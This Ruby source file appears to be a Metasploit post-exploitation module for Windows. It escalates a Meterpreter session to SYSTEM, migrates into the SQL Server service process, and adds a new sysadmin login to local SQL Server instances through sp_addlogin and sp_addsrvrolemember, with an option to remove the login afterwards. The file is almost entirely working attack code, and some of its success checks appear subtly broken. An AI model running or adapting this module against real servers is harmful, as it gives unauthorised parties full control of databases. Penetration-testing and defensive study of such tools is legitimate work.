##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/file'


class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Manage Local Microsoft SQL Server Authorization Bypass',
        'Description'   => %q{ When this module is executed, it can be used to add a sysadmin to local
        SQL Server instances.  It first attempts to gain LocalSystem privileges
        using the "getsystem" escalation methods. If those privileges are not
        sufficient to add a sysadmin, then it will migrate to the SQL Server
        service process associated with the target instance.  The sysadmin
        login is added to the local SQL Server using native SQL clients and
        stored procedures.  If no instance is specified then the first identified
        instance will be used.

        Why is this possible? By default in SQL Server 2k-2k8, LocalSystem
        is assigned syadmin privileges.  Microsoft changed the default in
        SQL Server 2012 so that LocalSystem no longer has sysadmin privileges.
        However, this can be overcome by migrating to the SQL Server process.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Scott Sutherland <scott.sutherland[at]netspi.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))

    register_options(
      [
        OptString.new('DB_USERNAME',  [true, 'New sysadmin login', '']),
        OptString.new('DB_PASSWORD',  [true, 'Password for new sysadmin login', '']),
        OptString.new('INSTANCE',  [false, 'Name of target SQL Server instance', '']),
        OptBool.new('REMOVE_LOGIN',  [false, 'Remove DB_USERNAME login from database', 'false'])
      ], self.class)
  end

  def run

    # Set verbosity level
    verbose = datastore['VERBOSE'].to_s.downcase

    # Set instance name (if specified)
    instance = datastore['INSTANCE'].to_s.upcase

    # Display target
    print_status("Running module against #{sysinfo['Computer']}")

    # Get LocalSystem privileges
    system_status = givemesystem
    if system_status[0]

      # Check if a SQL Server service is running
      service_instance = check_for_sqlserver(instance)
      if service_instance != 0

        # Identify available native SQL client
        sql_client = get_sql_client()
        if sql_client != 0

          # Check if remove_login was selected
          if datastore['REMOVE_LOGIN'].to_s.downcase == "false"

            # Add new login
            add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)
            if add_login_status == 1

              # Add login to sysadmin fixed server role
              add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)
            else

              if add_login_status != "userexists" then

                # Attempt to impersonate sql server service account (for sql server 2012)
                impersonate_status = impersonate_sql_user(service_instance,verbose)
                if impersonate_status == 1

                  # Add new login
                  add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)
                  if add_login_status == 1

                    # Add login to sysadmin fixed server role
                    add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)
                  end
                end
              end
            end
          else

            # Remove login
            remove_status = remove_sql_login(sql_client,datastore['DB_USERNAME'],instance,service_instance,verbose)
            if remove_status == 0

              # Attempt to impersonate sql server service account (for sql server 2012)
              impersonate_status = impersonate_sql_user(service_instance,verbose)
              if impersonate_status == 1

                # Remove login
                remove_sql_login(sql_client,datastore['DB_USERNAME'],instance,service_instance,verbose)
              end
            end
          end
        end
      end
    else
      print_error("Could not obtain LocalSystem privileges")
    end

    # return to original priv context
    session.sys.config.revert_to_self
  end


  ## ----------------------------------------------
  ## Method to check if the SQL Server service is running
  ## ----------------------------------------------
  def check_for_sqlserver(instance)

    print_status("Checking for SQL Server...")

    # Get Data
    running_services = run_cmd("net start")

    # Parse Data
    services_array = running_services.split("\n")

    # Check for the SQL Server service
    services_array.each do |service|
      if instance == "" then
        # Target default instance
        if service =~ /SQL Server \(| MSSQLSERVER/ then

          # Display results
          service_instance = service.gsub(/SQL Server \(/, "").gsub(/\)/, "").lstrip.rstrip
          print_good("SQL Server instance found: #{service_instance}")
          return service_instance
        end
      else

        # Target user defined instance
        if service =~ /#{instance}/ then

          # Display user defined instance
          print_good("SQL Server instance found: #{instance}")
          return instance
        end
      end
    end

    # Fail
    if instance == "" then
      print_error("SQL Server instance NOT found")
    else
      print_error("SQL Server instance \"#{instance}\" was NOT found")
    end
    return 0
  end


  ## ----------------------------------------------
  ## Method for identifying which SQL client to use
  ## ----------------------------------------------
  def get_sql_client

    print_status("Checking for native client...")

    # Get Data - osql
    running_services1 = run_cmd("osql -?")

    # Parse Data - osql
    services_array1 = running_services1.split("\n")

    # Check for osql
    if services_array1.join =~ /(SQL Server Command Line Tool)|(usage: osql)/
      print_good("OSQL client was found")
      return "osql"
    end

    # Get Data - sqlcmd
    running_services = run_cmd("sqlcmd -?")

    # Parse Data - sqlcmd
    services_array = running_services.split("\n")

    # Check for SQLCMD
    services_array.each do |service|
      if service =~ /SQL Server Command Line Tool/ then
        print_good("SQLCMD client was found")
        return "sqlcmd"
      end
    end

    # Fail
    print_error("No native SQL client was found")
    return 0
  end

  ## ----------------------------------------------
  ## Method for adding a login
  ## ----------------------------------------------
  def add_sql_login(sqlclient,dbuser,dbpass,instance,service_instance,verbose)

    print_status("Attempting to add new login #{dbuser}...")

    # Setup command format to accomidate version inconsistencies
    if instance == ""
      # Check default instance name
      if service_instance == "MSSQLSERVER" then
        print_status(" o MSSQL Service instance: #{service_instance}") if verbose == "true"
        sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""
      else
        # User defined instance
      print_status(" o  OTHER Service instance: #{service_instance}") if verbose == "true"
      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""
      end
    else
      # User defined instance
      print_status(" o defined instance: #{service_instance}") if verbose == "true"
      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{instance} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""
    end

    # Display debugging information
    print_status("Running command:") if verbose == "true"
    print_status("#{sqlcommand}") if verbose == "true"

    # Get Data
    add_login_result = run_cmd("#{sqlcommand}")

    # Parse Data
    add_login_array = add_login_result.split("\n")

    # Check if user exists
    add_login_array.each do |service|

      if service =~ /already exists/ then
        print_error("Unable to add login #{dbuser}, user already exists")
        return "userexists"
      end
    end

    # check for success/fail
    if add_login_result.empty? or add_login_result =~ /New login created./
      print_good("Successfully added login \"#{dbuser}\" with password \"#{dbpass}\"")
      return 1
    else
      print_error("Unable to add login #{dbuser}")
      print_error("Database Error:\n #{add_login_result}")
      return 0
    end
  end


  ## ----------------------------------------------
  ## Method for adding a login to sysadmin role
  ## ----------------------------------------------
  def add_sysadmin(sqlclient,dbuser,dbpass,instance,service_instance,verbose)

    print_status("Attempting to make #{dbuser} login a sysadmin...")

    # Setup command format to accomidate command inconsistencies
    if instance == ""
      # Check default instance name
      if service_instance == "MSSQLSERVER" then
        sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""
      else
        sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 \
        begin select 'bingo' end \""
      end
    else
      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{instance} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""
    end

    # Display debugging information
    print_status("Running command:") if verbose == "true"
    print_status("#{sqlcommand}") if verbose == "true"

    # Get Data
    add_sysadmin_result = run_cmd("#{sqlcommand}")

    # Parse Data
    add_sysadmin_array = add_sysadmin_result.split("\n")

    # Check for success
    check = 0
    add_sysadmin_array.each do |service|
      if service =~ /bingo/ then
          check = 1
      end
    end

    # Display results to user
    if check == 1
      print_good("Successfully added \"#{dbuser}\" to sysadmin role")
      return 1
    else
      # Fail
      print_error("Unabled to add #{dbuser} to sysadmin role")
      print_error("Database Error:\n\n #{add_sysadmin_result}")
      return 0
    end
  end


  ## ----------------------------------------------
  ## Method for removing login
  ## ----------------------------------------------
  def remove_sql_login(sqlclient,dbuser,instance,service_instance,verbose)

    print_status("Attempting to remove login \"#{dbuser}\"")

    # Setup command format to accomidate command inconsistencies
    if instance == ""
      # Check default instance name
      if service_instance == "SQLEXPRESS" then
        # Set command here for SQLEXPRESS
        sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS  -Q \"sp_droplogin '#{dbuser}'\""
      else
        sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\""
      end
    else
      # Set command here
      sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_droplogin '#{dbuser}'\""
    end

    # Display debugging information
    print_status("Settings:") if verbose == "true"
    print_status(" o SQL Client: #{sqlclient}") if verbose == "true"
    print_status(" o User: #{dbuser}") if verbose == "true"
    print_status(" o Service instance: #{service_instance}") if verbose == "true"
    print_status(" o User defined instance: #{instance}") if verbose == "true"
    print_status("Command:") if verbose == "true"
    print_status("#{sqlcommand}") if verbose == "true"

    # Get Data
    remove_login_result = run_cmd("#{sqlcommand}")

    # Parse Data
    remove_login_array = remove_login_result.split("\n")

    # Check for success
    check = 0
    remove_login_array.each do |service|
      if service =~ // then
          check = 1
      end
    end

    # Display result
    if check == 0
      print_good("Successfully removed login \"#{dbuser}\"")
      return 1
    else
      # Fail
      print_error("Unabled to remove login #{dbuser}")
      print_error("Database Error:\n\n #{remove_login_result}")
      return 0
    end
  end

  ## ----------------------------------------------
  ## Method for executing cmd and returning the response
  ##
  ## Note: This is from one of Jabra's modules - Thanks man!
  ## Note: This craps out when escalating from local admin to system
  ##       I assume it has something to do with the token, but don't
  ##       really know.
  ##----------------------------------------------
  def run_cmd(cmd,token=true)
    opts = {'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token}
    process = session.sys.process.execute(cmd, nil, opts)
    res = ""
    while (d = process.channel.read)
      break if d == ""
      res << d
    end
    process.channel.close
    process.close
    return res
  end


  ## ----------------------------------------------
  ## Method for impersonating sql server instance
  ## ----------------------------------------------
  def impersonate_sql_user(service_instance,verbose)

    # Print the current user
    blah = session.sys.config.getuid if verbose == "true"
    print_status("Current user: #{blah}") if verbose == "true"

    # Define target user/pid
    targetuser = ""
    targetpid = ""

    # Identify SQL Server service processes
    print_status("Searching for sqlservr.exe processes not running as SYSTEM...")
    session.sys.process.get_processes().each do |x|

      # Search for all sqlservr.exe processes
      if ( x['name'] == "sqlservr.exe" and x['user'] != "NT AUTHORITY\\SYSTEM")

        # Found one
        print_good("Found \"#{x['user']}\" running sqlservr.exe process #{x['pid']}")

        # Define target pid / user
        if x['user'] =~ /NT SERVICE/ then
          if x['user'] == "NT SERVICE\\MSSQL$#{service_instance}" then
            targetuser = "NT SERVICE\\MSSQL$#{service_instance}"
            targetpid = x['pid']
          end
        else
          targetuser = x['user']
          targetpid = x['pid']
        end
      end
    end

    # Attempt to migrate to target sqlservr.exe process
    if targetuser == "" then
      print_error("Unable to find sqlservr.exe process not running as SYSTEM")
      return 0
    else
      begin
        # Migrating works, but I can't rev2self after its complete
        print_status("Attempting to migrate to process #{targetpid}...")
        session.core.migrate(targetpid.to_i)

        # Statusing
        blah = session.sys.config.getuid if verbose == "true"
        print_status("Current user: #{blah}") if verbose == "true"
        print_good("Successfully migrated to sqlservr.exe process #{targetpid}")
        return 1
      rescue
        print_error("Unable to migrate to sqlservr.exe process #{targetpid}")
        return 0
      end
    end
  end


  ## ----------------------------------------------
  ## Method to become SYSTEM if required
  ## Note: This is from one of Jabra's modules.
  ## ----------------------------------------------
  def givemesystem

    # Statusing
    print_status("Checking if user is SYSTEM...")

    # Check if user is system
    if session.sys.config.getuid == "NT AUTHORITY\\SYSTEM"
      print_good("User is SYSTEM")
      return 1
    else
      # Attempt to get LocalSystem privileges
      print_error("User is NOT SYSTEM")
      print_status("Attempting to get SYSTEM privileges...")
      system_status = session.priv.getsystem
      if system_status[0]
        print_good("Success!, user is now SYSTEM")
        return 1
      else
        print_error("Unable to obtained SYSTEM privileges")
        return 0
      end
    end
  end

end
